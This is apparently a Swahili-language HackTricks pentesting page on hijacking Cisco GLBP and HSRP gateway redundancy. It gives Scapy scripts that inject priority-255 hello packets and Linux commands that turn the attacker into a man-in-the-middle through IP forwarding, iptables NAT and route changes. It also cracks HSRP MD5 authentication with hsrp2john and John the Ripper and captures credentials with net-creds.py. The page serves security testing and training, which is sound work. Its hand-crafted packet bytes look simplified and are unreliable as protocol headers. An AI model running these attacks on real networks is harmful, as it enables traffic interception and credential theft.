# Shambulio za GLBP & HSRP

{{#include ../../banners/hacktricks-training.md}}


## Muhtasari wa FHRP Hijacking

### Ufahamu kuhusu FHRP

FHRP imeundwa kutoa uimara wa mtandao kwa kuunganisha routers nyingi kuwa kitengo kimoja cha virtual, hivyo kuboresha ugawaji wa mzigo na uvumilivu wa hitilafu. Cisco Systems ilitengeneza protokoli maarufu ndani ya suite hii, kama GLBP na HSRP.

### Maelezo ya Protokoli ya GLBP

GLBP, iliyotengenezwa na Cisco, inafanya kazi kwenye stack ya TCP/IP, ikitumia UDP kwenye port 3222 kwa mawasiliano. Routers ndani ya kundi la GLBP hubadilishana pakiti za "hello" kila sekunde 3. Ikiwa router haitumi pakiti hizi kwa sekunde 10, inachukuliwa kuwa offline. Hata hivyo, vipimo hivi si thabiti na vinaweza kubadilishwa.

GLBP kwa IPv6 inatumia multicast **FF02::66** juu ya UDP/3222, na muundo wa virtual MAC unakuwa `0007.b4xx.xxyy` (AVF ID iko katika byte ya mwisho). Muda na uso wa shambulio vinabaki kama katika IPv4, hivyo hijack techniques bado zinafanya kazi katika mitandao ya dualâ€‘stack.

### Uendeshaji wa GLBP na Ugawaji wa Mzigo

GLBP inajitofautisha kwa kuwezesha ugawaji wa mzigo kati ya routers ikitumia virtual IP moja pamoja na anwani nyingi za virtual MAC. Katika kundi la GLBP, kila router hushiriki katika forwarding ya pakiti. Tofauti na HSRP/VRRP, GLBP hutoa ugawaji wa mzigo halisi kupitia mbinu kadhaa:

- **Ugawaji wa Mzigo Unaotegemea Host:** Huhifadhi ugawaji thabiti wa anwani za AVF MAC kwa host, muhimu kwa usanidi thabiti wa NAT.
- **Ugawaji wa Mzigo wa Round-Robin:** Mbinu ya chaguo-msingi, inabadilisha ugawaji wa anwani za AVF MAC kati ya hosts wanaoomba.
- **Ugawaji wa Mzigo wa Weighted Round-Robin:** Inagawanya mzigo kulingana na vipimo vya "Weight" vilivyowekwa awali.

### Vipengele Muhimu na Istilahi katika GLBP

- **AVG (Active Virtual Gateway):** Router kuu, anayehusika na kugawa anwani za MAC kwa routers wenzake.
- **AVF (Active Virtual Forwarder):** Router iliyoteuliwa kusimamia trafiki ya mtandao.
- **GLBP Priority:** Kipimo kinachobainisha AVG, kinaanza kwa default ya 100 na kinabadilika kutoka 1 hadi 255.
- **GLBP Weight:** Inaonyesha mzigo wa sasa kwenye router, inayoweza kubadilishwa kwa mkono au kupitia Object Tracking.
- **GLBP Virtual IP Address:** Inatumika kama gateway ya default ya mtandao kwa vifaa vyote vilivyounganishwa.

Kwa mawasiliano, GLBP inatumia anwani ya multicast iliyohifadhiwa 224.0.0.102 na UDP port 3222. Routers hutuma pakiti za "hello" kila sekunde 3, na zinachukuliwa kuwa hazifanyi kazi ikiwa pakiti itakosekana kwa muda wa sekunde 10.

### Mbinu ya Shambulio ya GLBP

Mshambulizi anaweza kuwa router kuu kwa kutuma GLBP packet yenye thamani ya priority ya juu (255). Hii inaweza kusababisha DoS au MITM attacks, ikiruhusu kukamata au kupitisha trafiki kwa njia nyingine.

**Practical GLBP hijack with Scapy (short PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Tengeneza bytes za payload ili kuiga header ya GLBP (version/opcode/priority/weight/VRID). Kuurudia frame kunahakikisha unashinda uchaguzi wa AVG ikiwa authentication haipo.

### Kutekeleza shambulio la GLBP kwa kutumia Loki

[Loki](https://github.com/raizo62/loki_on_kali) inaweza kufanya shambulio la GLBP kwa kuingiza packet yenye priority na weight imewekwa 255. Hatua za kabla ya shambulio zinajumuisha kukusanya taarifa kama virtual IP address, uwepo wa authentication, na router priority values kwa kutumia zana kama Wireshark.

Hatua za Shambulio:

1. Badilisha kwenda promiscuous mode na wezesha IP forwarding.
2. Tambua router lengwa na pata IP yake.
3. Tengeneza Gratuitous ARP.
4. Injeka packet ya GLBP yenye madhara, ikijifanya kuwa AVG.
5. Panga secondary IP address kwenye interface ya mtandao ya mshambulizi, ikifananisha na virtual IP ya GLBP.
6. Tekeleza SNAT kwa kuona trafiki yote kikamilifu.
7. Rekebisha routing ili kuhakikisha upatikanaji wa internet unaendelea kupitia router asili ya AVG.

Kwa kufuata hatua hizi, mshambulizi anajiweka kama "man in the middle", mwenye uwezo wa kukamata na kuchambua network traffic, ikiwa ni pamoja na data zisizofichwa (unencrypted) au nyeti.

Kwa maonyesho, hizi ni snippets za amri zinazohitajika:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Kufuatilia na kukamata trafiki kunaweza kufanywa kwa kutumia net-creds.py au zana zinazofanana ili kunasa na kuchambua data inayopita kupitia mtandao ulioshambuliwa.

### Ufafanuzi wa Pasivu wa HSRP Hijacking pamoja na Maelezo ya Amri

#### Overview of HSRP (Hot Standby Router/Redundancy Protocol)

HSRP ni itifaki ya milki ya Cisco iliyoundwa kwa ajili ya redundancy ya gateway ya mtandao. Inaruhusu usanidi wa multiple physical routers kuwa kitengo kimoja cha kimantiki chenye shared IP address. Kitengo hiki cha kimantiki kinakosolewa na primary router anayehusika na kuelekeza trafiki. Tofauti na GLBP, ambayo hutumia metrics kama priority na weight kwa load balancing, HSRP inategemea single active router kwa usimamizi wa trafiki.

HSRPv1 inatumia multicast **224.0.0.2** na virtual MAC `0000.0c07.acXX`; HSRPv2 and HSRPv2 for IPv6 use **224.0.0.102 / FF02::66** na virtual MAC `0000.0c9f.fXXX`. UDP destination port ni **1985** kwa IPv4 na **2029** kwa IPv6.

#### Roles and Terminology in HSRP

- **HSRP Active Router**: Kifaa kinachotenda kama gateway, kinachosimamia mtiririko wa trafiki.
- **HSRP Standby Router**: Router ya backup, tayari kuchukua nafasi ikiwa active router itashindwa.
- **HSRP Group**: Seti ya routers zinazoshirikiana kuunda single resilient virtual router.
- **HSRP MAC Address**: Anwani ya virtual MAC inayotolewa kwa router ya kimantiki katika usanidi wa HSRP.
- **HSRP Virtual IP Address**: Anwani ya IP ya kimantiki ya HSRP Group, inayotumika kama default gateway kwa vifaa vilivyounganishwa.

#### HSRP Versions

HSRP inakuja kwa toleo mbili, HSRPv1 na HSRPv2, tofauti hasa kwa group capacity, multicast IP usage, na virtual MAC address structure. Itifaki inatumia specific multicast IP addresses kwa kubadilishana taarifa za huduma, na Hello packets zinatumwa kila 3 seconds. Router inachukuliwa kuwa inactive ikiwa hakuna packet inayopokelewa ndani ya kipindi cha 10-second interval.

#### HSRP Attack Mechanism

Mashambulizi ya HSRP yanahusisha forcibly kuchukua nafasi ya Active Router kwa kuingiza maximum priority value. Hii inaweza kusababisha Man-In-The-Middle (MITM) attack. Hatua muhimu kabla ya shambulio ni kukusanya data kuhusu HSRP setup, ambayo inaweza kufanywa kwa kutumia Wireshark kwa traffic analysis.

**Haraka HSRP takeover na Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Ikiwa authentication **haijatayarishwa**, kutuma hellos kwa mfululizo zenye kipaumbele cha juu kunalazimisha peers kuingia katika hali za *Speak*/*Listen* na kunuwezesha kuwa *Active*, ukielekeza trafiki kupitia host yako.

**Kesi za pembeni za HSRP authentication**

- Legacy plain-text auth inaweza kuiga kwa urahisi.
- MD5 authentication inagusa tu HSRP payload; packets zilizotengenezwa zinaweza bado kusababisha rate-limit/DoS kwenye control planes. Toleo za NX-OS hapo awali ziliruhusu DoS dhidi ya authenticated groups (ona Cisco advisory CSCup11309).
- Katika VLANs nyingi za ISP / VPS zilizoshirikiwa, multicast za HSRPv1 zinaonekana kwa tenants; bila auth unaweza kujiunga na kuchukua nafasi ya trafiki.

#### Hatua za Kupitisha HSRP Authentication

1. Hifadhi trafiki ya mtandao yenye data za HSRP kama faili .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Toa MD5 hashes kutoka faili .pcap ukitumia hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Vunja MD5 hashes ukitumia John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Kutekeleza HSRP Injection kwa kutumia Loki**

1. Zindua Loki ili kubaini matangazo ya HSRP.
2. Weka interface ya mtandao katika promiscuous mode na wezesha IP forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Tumia Loki kumlenga router maalum, ingiza password ya HSRP iliyovunjwa, na fanya usanidi unaohitajika kuiga Active Router.
4. Baada ya kupata cheo cha Active Router, sanidi interface yako ya mtandao na iptables ili kukamata trafiki halali.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Badilisha routing table ili kupitisha trafiki kupitia router aliyekuwa Active awali.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Tumia net-creds.py au utility sawa kukamata credentials kutoka kwa trafiki iliyokamatwa.
```shell
sudo python2 net-creds.py -i eth0
```

Kutekeleza hatua hizi kunamweka mshambuliaji katika nafasi ya kukamata na kuingilia trafiki, sawa na taratibu za GLBP hijacking. Hii inaonyesha udhaifu katika protocols za redundancy kama HSRP na umuhimu wa hatua za usalama thabiti.

## Marejeo

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
